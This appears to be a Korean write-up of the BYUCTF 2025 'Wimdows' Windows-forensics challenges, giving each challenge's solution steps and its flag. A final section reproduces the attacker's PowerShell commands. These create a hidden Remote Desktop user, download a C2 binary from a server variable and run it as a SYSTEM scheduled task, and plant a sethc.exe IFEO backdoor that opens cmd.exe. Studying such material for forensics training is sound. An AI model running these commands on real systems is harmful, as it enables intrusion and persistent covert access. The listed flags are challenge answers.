# 🪟 BYUCTF 2025 - Wimdows 시리즈

## 🖥️ 공통 정보

- 문제 유형: Windows 포렌식 (디스크/로그 기반 분석)
- 제공 파일: [Windows 가상 머신 다운로드](https://byu.box.com/v/byuctf-wimdows)  
- 로그인 정보: `vagrant / vagrant`
- 공통 힌트: 모든 문제는 **Event Viewer (이벤트 로그)** 및 **System** 분석으로 해결 가능함

---

## 1️⃣ Wimdows 1 - Exploited CVE 찾기

### 🔍 설명

공격자가 Windows 서버에 침투함. 어떤 취약점을 이용해 셸을 얻었는지 파악해야 함.  
플래그 형식: `byuctf{CVE-YYYY-NNNN}`

### 🛠️ 풀이 요약

- System 로그에서 `elasticsearch-service-x64.exe`를 부모로 하는 SYSTEM 권한 프로세스 다수 발견
- 해당 ElasticSearch 버전: **1.1.1**
- 관련 CVE 중 **RCE가 가능한 유일한 취약점**: `CVE-2014-3120`
- ![image](https://github.com/user-attachments/assets/30a7b886-848e-4250-8f69-43bdd03d183a)


### ✅ 정답

byuctf{CVE-2014-3120}



---

## 2️⃣ Wimdows 2 - 숨겨진 명령 내역

### 🔍 설명

공격자가 침투 후 명령어를 실행했지만, 로그를 은폐하려고 시도함.  
Event Log에서 흔적을 찾아야 함.  
플래그는 이미 `byuctf{}` 형식으로 숨겨져 있음.

### 🛠️ 풀이 요약

- Windows Event Log > PowerShell 로그 확인
- Base64 인코딩된 명령어들 중 하나에 플래그 포함됨

### ✅ 정답

byuctf{n0w_th4t5_s0m3_5u5_l00k1ng_p0w3rsh3ll_139123}


---

## 3️⃣ Wimdows 3 - 공격자가 만든 계정의 그룹

### 🔍 설명

공격자가 만든 새로운 계정을 어떤 그룹에 추가했는지 확인해야 함  
예시 형식: `byuctf{Remote Desktop Users}`  
대소문자 무시

### 🛠️ 풀이 요약

- Event Log에서 `phasma` 사용자 계정이 `Remote Desktop Users` 그룹에 추가된 이벤트 확인

### ✅ 정답

byuctf{Remote Desktop Users}


---

## 4️⃣ Wimdows 4 - C2 바이너리 및 서버 IP

### 🔍 설명

공격자가 C2 바이너리를 배포함.  
사용된 C2 프레임워크와 해당 C2 서버 IP를 확인해야 함.  
형식: `byuctf{<c2 framework>_<ip address>}`

### 🛠️ 풀이 요약

- `C:\Windows\System32\update.exe` 확인
- VirusTotal에 업로드하여 C2 프레임워크가 **Sliver**임을 확인
- Netstat 등으로 서버 IP 확인: `192.168.1.224`

### ✅ 정답

byuctf{sliver_192.168.1.224}


---

## 5️⃣ Wimdows 5 - SYSTEM 권한 백도어

### 🔍 설명

공격자가 SYSTEM 권한을 얻기 위해 설치한 **백도어**를 찾아야 함  
답은 `byuctf{}` 형식으로 Registry에 숨겨져 있음

### 🛠️ 풀이 요약

- Sysmon에서 `sethc.exe`에 대한 `IFEO (Image File Execution Options)` 레지스트리 키 수정 확인
- `sethc.exe`가 `cmd.exe`로 리디렉션되어 있으며, 값 뒤에 주석 형태로 플래그 포함됨

### ✅ 정답

byuctf{00p5_4ll_b4ckd00r5_139874}


---

## 🛠️ 참고: 공격 재현 과정

```powershell
# Wimdows 2
whoami /priv
ls -l
write-output 'byuctf{n0w_th4t5_s0m3_5u5_l00k1ng_p0w3rsh3ll_139123}'
get-process
get-service

# Wimdows 3
net user phasma f1rst0rd3r! /add
New-Item -Path "HKLM:\...\UserList" -Force | Out-Null
New-ItemProperty -Path "HKLM:\...\UserList" -Name "phasma" -Value 0 -PropertyType DWord -Force
net localgroup "Remote Desktop Users" phasma /add

# Wimdows 4
Invoke-WebRequest -Uri "http://${server_ip}:8000/update.exe" -OutFile "C:\Windows\System32\update.exe"
schtasks /create /tn "updates" /tr "C:\Windows\System32\update.exe" /ru 'SYSTEM' /sc onstart /rl highest
schtasks /run /tn "updates"

# Wimdows 5 (in Sliver)
REG ADD "HKLM\...\sethc.exe" /v Debugger /d "C:\windows\system32\cmd.exe #byuctf{00p5_4ll_b4ckd00r5_139874}" /f
